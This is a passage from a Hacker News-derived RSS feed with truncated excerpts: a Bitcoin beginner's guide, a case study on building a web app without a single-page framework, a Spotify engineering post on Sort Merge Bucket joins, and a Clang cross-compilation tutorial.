Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ― so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop’s window that says “Bitcoin accepted here.” As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112188</guid>
            <pubDate>Fri, 12 Feb 2021 10:29:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building web apps without a SPA – A case study]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112011">thread link</a>) | @RupertWiser
<br/>
February 12, 2021 | http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html | <a href="https://web.archive.org/web/*/http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p id="h.l7qn47u1544x"><span>Building web apps without a SPA - A case study</span></p><p><span>We all know that feeling. You’re scrolling through a page that’s full of mostly static content - constantly being interrupted by spinners - and the thought hits you, “Why did they use Javascript for this?”</span></p><p><span>Now this might not always be fair. I’ve done a fair amount of web development and there is definitely a time and a place for a SPA. And rendering libraries like React make client side work an absolute pleasure. But that’s not what I’m going to write about today. I’m going to write about all the </span><span>other</span><span>&nbsp;cases. Or as I like to call it, 73.6% of the internet.</span></p><p><span>My fiance is studying to become a veterinary physiotherapist. She has to learn </span><span>a lot</span><span>&nbsp;of animal body parts. She’s picked up a few books along the way to help her memorise various animal parts that normally look something like this:</span></p><p><span><img alt="" src="https://lh6.googleusercontent.com/kALs0Nu-AjBdB7ujRxyewUokHCMcT-idZaQ0aqQrhVJUP8x3c1g4Hf3E_3A_DZWW-TOdcig3Y_gl3Z8zzE0uqPyEh0I2fI6Gw1nX_VGNnOMX1ekeUI8nrdKaxeet8SYKkLqsLbeg" title=""></span></p><p><span>Ladies and Gentlemen, the canine</span></p><p><span>I took a look at the content she was studying and thought it would probably be handy if we could put all those pictures into a little quiz app so that she could test herself. After a bit of requirements gathering, it was decided it needed to support:</span></p><ul><li><span>Profiles</span></li><li><span>A group management system to share profiles with others</span></li><li><span>Referencing and tags</span></li><li><span>Some way for her to upload pictures and map body parts</span></li><li><span>Quizzes (of course!)</span></li></ul><p><span>To keep it simple, we added two types of quizzes. The first kind points to a body part and asks you to choose what limb it is. The second kind of quiz names a part and asks you to select it on the picture. All you need to do is first prepare quizzes by uploading images and selecting the limbs.</span></p><p><span>This is what is ends up looking like:</span></p><p><span><img alt="" src="https://lh3.googleusercontent.com/lLiY8kQz2JfDyeySZgzE6cC24HcQ_0MAw5a8ePJA1y94d5j-gDvv2e5aKOuYW7g0sKqW2qTfxKydlL1n_qCydremS_9GUpD-B9ymUfsXhwqxnjCbDkJD1TOiof5vU2vnxiZuKC_d" title=""></span></p><p><span>And here is what a quiz looks like:</span></p><p><span><img alt="" src="https://lh6.googleusercontent.com/nlY63N83LNXIJmA9fp530SXydjZIO16NLY1HUP9MVw-nQHQIYbU0RoglAf-QOSYgd3Yzwxz1WjnTCuFNxeAaFbgJxHFafhFQYQwB029O_ht-BbyN8kFKyEn-aYPOlIglV4lTKroJ" title=""></span></p><p><span>Nothing about this is particularly complex. I probably took around a day or so in total to add everything we wanted. I worked fast and loose and skipped automated tests because I don’t plan to work on it further (and most of it is CRUD operations).</span></p><p><span>What I would like to emphasize at this point is that I’ve seen many projects with a similar scope become a React/Angular/Bitcoin app. There are a few reasons I can think of (off the top of my head) for this:</span></p><ol start="1"><li><span>The developer would like to learn a new stack (nothing wrong with this!)</span></li><li><span>The developer uses it out of muscle memory</span></li><li><span>The developer wants to create an app like experience and things this will result in faster performance</span></li></ol><p><span>I have no issue with the first reason. I also don’t have an issue with the second reason when you just want to get something done fast and you’re comfortable with a way of working. What I would like to question however is the third reason.</span></p><p><span>When working on a smaller project, I often find that it is both simpler to reason with, and faster to write everything in the backend. And I don’t just mean faster in terms of development. I think you can make a much faster system overall when you’re not sending a bulky javascript bundle that needs to perform client side rendering.</span></p><p><span>As it turns out, a lot of people think server side rendering is slow simply because of the downloading and parsing browsers need to do with javascript. But there’s a handy little library I absolutely love that alleviates this problem entirely. </span><span><a href="https://github.com/turbolinks/turbolinks">Turbolinks</a></span><span>&nbsp;(made by the good folks at </span><span><a href="https://basecamp.com/">basecamp</a></span><span>) intercepts the links on your page and replaces them with ajax requests. It then takes care of placing the content back in your page. What this means is that you can entirely work </span><span>as if</span><span>&nbsp;your app is entirely server side, while still leaving it feeling very much like a web app. And the best part is we get to leave the browser to do the rendering work instead of a javascript engine! Browsers are actually pretty good at doing that.</span></p><p><span>Here’s what it ends up looking like in action:</span></p><p><span><img alt="" src="https://lh4.googleusercontent.com/-blx8YYUJdB1_aOeLIz7VAlPxsVolWFfNOA9uMvo1r41gUFUG-lv-u3wrqx6tRq5BOCRy5oJF4kDsNBh5UjH8hCsC6Bowlcl3umzLrAWlJHJUTyPQRB16VA-EdLMp0Xao_vAVFa4" title=""></span></p><p><span>Disclaimer:</span><span>&nbsp;I haven’t given it a go yet because it’s still in beta but the basecamp team has moved onto </span><span><a href="https://github.com/hotwired/turbo">Turbo</a></span><span>&nbsp;which is supposed to replace Turbolinks.</span></p><p><span>Then just to be extra safe, for the small parts of javascript I do use (for the quiz questions) I use </span><span><a href="https://rollupjs.org/guide/en/">rollup</a></span><span>&nbsp;to bundle it together. This ends up producing a very nice and small javascript bundle because I refused to use any javascript dependencies for the client side code. The bundle clocks in around 3.9kB.</span></p><p><span>What this results in is a very light weight, and easy to develop web app. Obviously there’s not a silver bullet that solves all problems but the next time you’re building a web app, it might be worth taking a step back and asking the question, “Do I really need a javascript frontend framework for this?”</span></p><p><span>As always you can find the code here if you want to take a deeper look:</span></p><p><span><a href="https://gitlab.com/BenWiser/physio-quiz">https://gitlab.com/BenWiser/physio-quiz</a></span></p></div></div>]]>
            </description>
            <link>http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112011</guid>
            <pubDate>Fri, 12 Feb 2021 09:47:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020]]>
            </title>
            <description>
<![CDATA[
Score 190 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26111993">thread link</a>) | @SirOibaf
<br/>
February 12, 2021 | https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020 | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!-- post title -->
        

        <div>
            <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>February 11, 2021</span>
                
            </p>
        </div>
        <!-- post details -->
        <p><a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020/" title="How Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020">
                        <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image1.gif" alt="" loading="lazy" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2021/02/image1.gif">                    </a></p>

        <!-- /post title -->

        
<p>In this post we’ll discuss how Spotify optimized and sped up elements from our largest Dataflow job, <a rel="noreferrer noopener" href="https://engineering.atspotify.com/2020/02/18/spotify-unwrapped-how-we-brought-you-a-decade-of-data/" target="_blank">Wrapped 2019</a>, for <a href="https://open.spotify.com/genre/2020-page">Wrapped 2020</a> using a technique called Sort Merge Bucket (SMB) join. We’ll present the design and implementation of SMB and how we incorporated it into our data pipelines.</p>



<h2>Introduction</h2>



<p>Shuffle is the core building block for many big data transforms, such as a join, GroupByKey, or other reduce operations. Unfortunately, it’s also one of the most expensive steps in many pipelines. Sort Merge Bucket is an optimization that reduces shuffle by doing work up front on the producer side. The intuition is that for datasets commonly and frequently joined on a known key, e.g., user events with user metadata on a user ID, we can write them in bucket files with records bucketed and sorted by that key. By knowing which files contain a subset of keys and in what order, shuffle becomes a matter of merge-sorting values from matching bucket files, completely eliminating costly disk and network I/O of moving key–value pairs around. Andrea Nardelli carried out the original investigation on Sort Merge Buckets for his <a href="http://kth.diva-portal.org/smash/get/diva2:1334587/FULLTEXT01.pdf">2018 master’s thesis</a>, and we started looking into generalizing the idea as a <a rel="noreferrer noopener" href="https://spotify.github.io/scio/extras/Sort-Merge-Bucket.html" target="_blank">Scio module</a> afterwards.</p>



<h2>Design and Implementation</h2>



<p>The majority of the data pipelines at Spotify are written in <a rel="noreferrer noopener" href="https://github.com/spotify/scio" target="_blank">Scio</a>, a Scala API for <a href="https://beam.apache.org/">Apache Beam</a>, and run on the <a href="https://cloud.google.com/dataflow">Google Cloud Dataflow</a> service. We implemented SMB in Java to be closer to the native Beam SDK (and even wrote and collaborated on a <a href="https://docs.google.com/document/d/1AQlonN8t4YJrARcWzepyP7mWHTxHAd6WIECwk1s3LQQ/edit?usp=sharing">design document with the Beam community</a>), and provide Scala syntactic sugar in Scio like many other I/Os. The design is modularized into the main components listed below — we’ll start with the two top-level SMB <a href="https://beam.apache.org/documentation/programming-guide/#transforms" target="_blank" rel="noreferrer noopener">PTransforms</a> — the write and read operations SortedBucketSink and SortedBucketSource.</p>



<h3>SortedBucketSink</h3>



<p>This transform writes a <a rel="noreferrer noopener" href="https://beam.apache.org/documentation/programming-guide/#pcollections" target="_blank">PCollection</a>&lt;T&gt; (where T has a corresponding <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/FileOperations.java" target="_blank" rel="noreferrer noopener">FileOperations&lt;T&gt;</a> instance) in SMB format. It first extracts keys and assigns bucket IDs using logic provided by <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/BucketMetadata.java" target="_blank" rel="noreferrer noopener">BucketMetadata</a>, groups key–values by the ID, sorts all values, and then writes them into files corresponding to bucket IDs using the FileOperations instance.</p>



<p>In addition to the bucket files, a JSON file is also written to the output directory representing the information from BucketMetadata that’s necessary to read the source: the number of buckets, the hashing scheme, and the instructions to extract the key from each record (for example, for Avro records we can encode this instruction with the name of the GenericRecord field containing the key).</p>



<figure><img loading="lazy" width="700" height="255" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-250x91.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-768x280.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-120x44.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5.png 1180w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>SortedBucketSource</h3>



<p>This transform reads from one or more sources written in SMB format with the same key and hashing scheme. It opens file handles for corresponding buckets from each source (using FileOperations&lt;T&gt; for that input type) and merges them while maintaining sorted order. Results are emitted as <a rel="noreferrer noopener" href="https://github.com/apache/beam/blob/master/sdks/java/core/src/main/java/org/apache/beam/sdk/transforms/join/CoGbkResult.java" target="_blank">CoGbkResult</a> objects per key group, the same class Beam uses for regular Cogroup operations, so the user can extract the results per source with the correct parameterized type.</p>



<figure><img loading="lazy" width="700" height="365" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-250x130.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-768x400.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-120x63.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7.png 1067w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>FileOperations</h3>



<p>FileOperations abstracts away the reading and writing of individual bucket files. Since we need fine-grained control over the exact elements and their order in every file, we cannot leverage the existing Beam file I/Os, which operate on a PCollection level and abstract away the locality and order of elements. Instead, SMB file operations happen at a lower level of BoundedSource for input and ParDo for output. Currently Avro, BigQuery TableRow JSON, and TensorFlow TFRecord/Example records are supported. We plan to add other formats like Parquet as well.</p>



<h3>BucketMetadata</h3>



<p>This class abstracts the keying and bucketing of elements, and includes information such as key field, class, number of buckets, shards, and hash function. The metadata is serialized as a JSON file alongside data files when writing, and used to check compatibility when reading SMB sources.</p>



<h3>Optimizations and Variants</h3>



<p>Over the last year and a half we’ve been adopting SMB at Spotify for various use cases, and accumulated many improvements to handle the scale and complexity of our data pipelines.</p>



<ul><li><strong>Date partitioning:</strong> At Spotify, event data is written to Google Cloud Services (GCS) in hourly or daily partitions. A common data engineering use case is to read many partitions in a single pipeline — for example, to compute stream count over the last seven days. For a non-SMB read, this can be easily done in a single PTransform using wildcard file patterns to match files across multiple directories. However, unlike most File I/Os in Beam, the SMB Read API requires the input to be specified as a directory, rather than a file pattern (this is because we need to check the directory’s metadata.json file as well as the actual record files). Additionally, it must match up bucket files across partitions as well as across different sources, while ensuring that the CoGbkResult output correctly groups data from all partitions of a source into the same TupleTag key. We evolved the SMB Read API to accept one or more directories <em>per source</em>.&nbsp;</li></ul>



<ul><li><strong>Sharding:</strong> Although the Murmur class of hash functions we use during bucket assignment usually ensures an even distribution of records across buckets, in some instances one or more buckets may be disproportionately large if the key space is skewed, creating possible OOM errors when grouping and sorting records. In this case, we allow users to specify a number of <em>shards</em> to further split each bucket file. During the bucket assignment step, a value between [0, numShards) is generated randomly <a href="https://beam.apache.org/documentation/runtime/model/#bundling-and-persistence"><em>per bundle</em></a>. Since this value is computed completely orthogonally to the bucket ID, it can break up large key groups across files. Since each shard is still written in sorted order, they can simply be merged together at read time.</li></ul>



<ul><li><strong>Parallelism:</strong> Since the number of buckets in an SMB sink is always a power of 2, we can come up with a joining scheme across sources with different numbers of buckets based off of a desired level of parallelism specified by the user. For example, if the user wants to join Source 1 with 4 buckets and Source 2 with 2 buckets, they can specify either:<ul><li><strong>Minimum parallelism,</strong> or “Merge Greatest Buckets” strategy: 2 parallel readers will be created. Each reader will read 2 buckets from source A and 1 from source B, merging them together. Because bucket IDs are assigned by taking the integer hash value of the key modulo the desired number of buckets, mathematically we know that the key spaces of the merged buckets overlap.</li><li><strong>Maximum parallelism,</strong> or “Least Bucket Replication” strategy: 4 parallel readers will be created. Each reader will read 1 bucket from Source A and 1 from Source B. After merging each key group, the reader will have to rehash the key modulo the greatest number of buckets, to avoid emitting duplicate values. Therefore, even though this strategy achieves a higher level of parallelism, there is some overhead of computing duplicate values and rehashing to eliminate them.</li><li><strong>Auto parallelism:</strong> Creates a number of readers between minimal and maximal amounts, based on a desired split size value provided by the Runner at runtime.</li></ul></li></ul>



<figure><img loading="lazy" width="700" height="459" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-250x164.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-768x504.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-120x79.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3.png 1115w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>SortedBucketTransform:</strong> A common usage pattern is for pipelines to enrich an existing dataset by joining it with one or more other sources, then writing it to an output location. We decided to specifically support this in SMB with a unique PTransform that reads, transforms, and writes output using the same keying and bucketing scheme. By doing the read/transform/write logic per bucket on the same worker, we can avoid having to reshuffle the data and recompute buckets — since the key is the same, we know that the transformed elements from bucket M of the inputs also correspond to bucket M in the output, in the same sorted order as they were read from.</li></ul>



<figure><img loading="lazy" width="700" height="320" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-250x114.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-768x351.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-120x55.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4.png 902w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>External Sort:</strong> We made a number of improvements to Beam’s <a href="https://github.com/apache/beam/tree/master/sdks/java/extensions/sorter">external sorter extension</a>, including replacing the Hadoop sequence file with the native file I/O, removing the 2GB memory limit, and reducing disk usage and coder overhead.</li></ul>



<h2>Adoption — Core Data Producers</h2>



<p>Since SMB requires data to be bucketed and sorted in a specific fashion, the adoption naturally starts from the producer of that data. A majority of the Spotify data processing relies on a few core data sets that act as single sources of truth for various business domains like streaming activities, user metadata and streaming context. We worked with the maintainer of these data sets to convert a year’s worth of data to SMB format.</p>



<p>Implementation was straightforward since SortedBucketSink is mostly a drop-in replacement for the vanilla Avro sink with some extra settings. We were using Avro sink with the sharding option to control the number and size of output files. After migrating to SMB, we did not notice any major bump in terms of vCPU, vRAM, or wall time since sharding requires a full shuffle similar to the additional cost of SMB sinks. A few other settings we have since had to tweak:</p>



<ul><li>Agree on user_id as a hexadecimal string as bucket and sort key, since we need the same key type and semantic across all SMB datasets.</li><li>Set compression to DEFLATE with level 6 to be consistent with the default Avro sink in Scio. As a nice side effect of data being bucketed and sorted by key, we observed ~50% reduction in storage from better compression due to collocation of similar records.</li><li>Make sure output files are backwards compatible. SMB output files have “bucket-X-shard-Y” in their names but otherwise contain the same records with the same schema. So existing pipelines can consume them without any code change; they just do not leverage the speedup in certain join cases.</li></ul>



<h2>Adoption — Wrapped 2020</h2>



<p>Once the core datasets were available in SMB format, we …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</a></em></p>]]>
            </description>
            <link>https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111993</guid>
            <pubDate>Fri, 12 Feb 2021 09:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use Clang to cross compile for everything]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26111761">thread link</a>) | @mcilloni
<br/>
February 12, 2021 | https://mcilloni.ovh/2021/02/09/cxx-cross-clang/ | <a href="https://web.archive.org/web/*/https://mcilloni.ovh/2021/02/09/cxx-cross-clang/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>09 Feb 2021</span></p><p>Anyone who ever tried to cross-compile a C/C++ program knows how big a PITA the whole process could be. The main reasons for this sorry state of things are generally how byzantine build systems tend to be when configuring for cross-compilation, and how messy it is to set-up your cross toolchain in the first place.</p>

<p>One of the main culprits in my experience has been the GNU toolchain, the decades-old behemoth upon which the POSIXish world has been built for years.
Like many compilers of yore, GCC and its <code>binutils</code> brethren were never designed with the intent to support multiple targets within a single setup, with he only supported approach being installing a full cross build for each triple you wish to target on any given host.</p>

<p>For instance, assuming you wish to build something for FreeBSD on your Linux machine using GCC, you need:</p>

<ul>
  <li>A GCC + binutils install for your host triplet (i.e., <code>x86_64-pc-linux-gnu</code> or similar);</li>
  <li>A GCC + binutils complete install for your target triplet (i.e. <code>x86_64-unknown-freebsd12.2-gcc</code>, <code>as</code>, <code>nm</code>, etc)</li>
  <li>A sysroot containing the necessary libraries and headers, which you can either build yourself or promptly steal from a running installation of FreeBSD.</li>
</ul>

<p>This process is sometimes made simpler by Linux distributions or hardware vendors offering a selection of prepackaged compilers, but this will never suffice due to the sheer amount of possible host-target combinations. This sometimes means you have to build the whole toolchain yourself, something that, unless you rock a quite beefy CPU, tends to be a massive waste of time and power.</p>

<h2 id="clang-as-a-cross-compiler">Clang as a cross compiler</h2>

<p>This annoying limitation is one of the reasons why I got interested in LLVM (and thus Clang), which is by-design a full-fledged cross compiler toolchain and is mostly compatible with GNU. A single install can output and compile code <em>for every supported target</em>, as long as a complete sysroot is available at build time.</p>

<p>I found this to be a game-changer, and, while it can’t still compete in convenience with modern language toolchains (such as Go’s gc and <code>GOARCH</code>/<code>GOOS</code>), it’s night and day better than the rigmarole of setting up GNU toolchains. You can now just fetch whatever your favorite package management system has available in its repositories (as long as it’s not extremely old), and avoid messing around with multiple installs of GCC.</p>

<p>Until a few years ago, the whole process wasn’t as smooth as it could be. Due to LLVM not having a full toolchain yet available, you were still supposed to provide a <code>binutils</code> build specific for your target. While this is generally much more tolerable than building the whole compiler (<code>binutils</code> is relatively fast to build), it was still somewhat of a nuisance, and I’m glad that <code>llvm-mc</code> (LLVM’s integrated assembler) and <code>lld</code> (universal linker) are finally stable and as flexible as the rest of LLVM.</p>

<p>With the toolchain now set, the next step becomes to obtain a sysroot in order to provide the needed headers and libraries to compile and link for your target.</p>

<h2 id="obtaining-a-sysroot">Obtaining a sysroot</h2>
<p>A super fast way to find a working system directory for a given OS is to rip it straight out of an existing system (a Docker container image will often also do).
For instance, this is how I used <code>tar</code> through <code>ssh</code> as a quick way to extract a working sysroot from a FreeBSD 13-CURRENT AArch64 VM <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>:</p>

<div><div><pre><code>$ mkdir ~/farm_tree
$ ssh FARM64 'tar cf - /lib /usr/include /usr/lib /usr/local/lib /usr/local/include' | bsdtar xvf - -C $HOME/farm_tree/
</code></pre></div></div>

<h2 id="invoking-the-cross-compiler">Invoking the cross compiler</h2>

<p>With everything set, it’s now only a matter of invoking Clang with the right arguments:</p>

<div><div><pre><code><span>$ </span> clang++ <span>--target</span><span>=</span>aarch64-pc-freebsd <span>--sysroot</span><span>=</span><span>$HOME</span>/farm_tree <span>-fuse-ld</span><span>=</span>lld <span>-stdlib</span><span>=</span>libc++ <span>-o</span> zpipe zpipe.cc <span>-lz</span> <span>--verbose</span>
clang version 11.0.1
Target: aarch64-pc-freebsd
Thread model: posix
InstalledDir: /usr/bin
 <span>"/usr/bin/clang-11"</span> <span>-cc1</span> <span>-triple</span> aarch64-pc-freebsd <span>-emit-obj</span> <span>-mrelax-all</span> <span>-disable-free</span> <span>-disable-llvm-verifier</span> <span>-discard-value-names</span> <span>-main-file-name</span> zpipe.cc <span>-mrelocation-model</span> static <span>-mframe-pointer</span><span>=</span>non-leaf <span>-fno-rounding-math</span> <span>-mconstructor-aliases</span> <span>-munwind-tables</span> <span>-fno-use-init-array</span> <span>-target-cpu</span> generic <span>-target-feature</span> +neon <span>-target-abi</span> aapcs <span>-fallow-half-arguments-and-returns</span> <span>-fno-split-dwarf-inlining</span> <span>-debugger-tuning</span><span>=</span>gdb <span>-v</span> <span>-resource-dir</span> /usr/lib/clang/11.0.1 <span>-isysroot</span> /home/marco/farm_tree <span>-internal-isystem</span> /home/marco/farm_tree/usr/include/c++/v1 <span>-fdeprecated-macro</span> <span>-fdebug-compilation-dir</span> /home/marco/dummies/cxx <span>-ferror-limit</span> 19 <span>-fno-signed-char</span> <span>-fgnuc-version</span><span>=</span>4.2.1 <span>-fcxx-exceptions</span> <span>-fexceptions</span> <span>-faddrsig</span> <span>-o</span> /tmp/zpipe-54f1b1.o <span>-x</span> c++ zpipe.cc
clang <span>-cc1</span> version 11.0.1 based upon LLVM 11.0.1 default target x86_64-pc-linux-gnu
<span>#include "..." search starts here:</span>
<span>#include &lt;...&gt; search starts here:</span>
 /home/marco/farm_tree/usr/include/c++/v1
 /usr/lib/clang/11.0.1/include
 /home/marco/farm_tree/usr/include
End of search list.
 <span>"/usr/bin/ld.lld"</span> <span>--sysroot</span><span>=</span>/home/marco/farm_tree <span>--eh-frame-hdr</span> <span>-dynamic-linker</span> /libexec/ld-elf.so.1 <span>--enable-new-dtags</span> <span>-o</span> zpipe /home/marco/farm_tree/usr/lib/crt1.o /home/marco/farm_tree/usr/lib/crti.o /home/marco/farm_tree/usr/lib/crtbegin.o <span>-L</span>/home/marco/farm_tree/usr/lib /tmp/zpipe-54f1b1.o <span>-lz</span> <span>-lc</span>++ <span>-lm</span> <span>-lgcc</span> <span>--as-needed</span> <span>-lgcc_s</span> <span>--no-as-needed</span> <span>-lc</span> <span>-lgcc</span> <span>--as-needed</span> <span>-lgcc_s</span> <span>--no-as-needed</span> /home/marco/farm_tree/usr/lib/crtend.o /home/marco/farm_tree/usr/lib/crtn.o
<span>$ </span>file zpipe
zpipe: ELF 64-bit LSB executable, ARM aarch64, version 1 <span>(</span>FreeBSD<span>)</span>, dynamically linked, interpreter /libexec/ld-elf.so.1, <span>for </span>FreeBSD 13.0 <span>(</span>1300136<span>)</span>, FreeBSD-style, with debug_info, not stripped
</code></pre></div></div>

<p>In the snipped above, I have managed to compile and link a C++ file into an executable for AArch64 FreeBSD, all while using just the <code>clang</code> and <code>lld</code> I had already installed on my GNU/Linux system.</p>

<p>More in detail:</p>
<ol>
  <li><code>--target</code> switches the LLVM default target (<code>x86_64-pc-linux-gnu</code>) to <code>aarch64-pc-freebsd</code>, thus enabling cross-compilation.</li>
  <li><code>--sysroot</code> forces Clang to assume the specified path as root when searching headers and libraries, instead of the usual paths. Note that sometimes this setting might not be enough, especially if the target uses GCC and Clang somehow fails to detect its install path. This can be easily fixed by specifying <code>--gcc-toolchain</code>, which clarifies where to search for GCC installations.</li>
  <li><code>-fuse-ld=lld</code> tells Clang to use <code>lld</code> instead whatever default the platform uses. As I will explain below, it’s highly unlikely that the system linker understands foreign targets, while LLD can natively support <em>almost</em> every binary format and OS <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</li>
  <li><code>-stdlib=libc++</code> is needed here due to Clang failing to detect that FreeBSD on AArch64 uses LLVM’s <code>libc++</code> instead of GCC’s <code>libstdc++</code>.</li>
  <li><code>-lz</code> is also specified to show how Clang can also resolve other libraries inside the sysroot without issues, in this case, <code>zlib</code>.</li>
</ol>

<p>The final test is now to copy the binary to our target system (i.e. the VM we ripped the sysroot from before) and check if it works as expected:</p>

<div><div><pre><code><span>$ </span>rsync zpipe FARM64:<span>"~"</span>
<span>$ </span>ssh FARM64
FreeBSD-ARM64-VM <span>$ </span><span>chmod</span> +x zpipe
FreeBSD-ARM64-VM <span>$ </span>ldd zpipe
zpipe:
        libz.so.6 <span>=&gt;</span> /lib/libz.so.6 <span>(</span>0x4029e000<span>)</span>
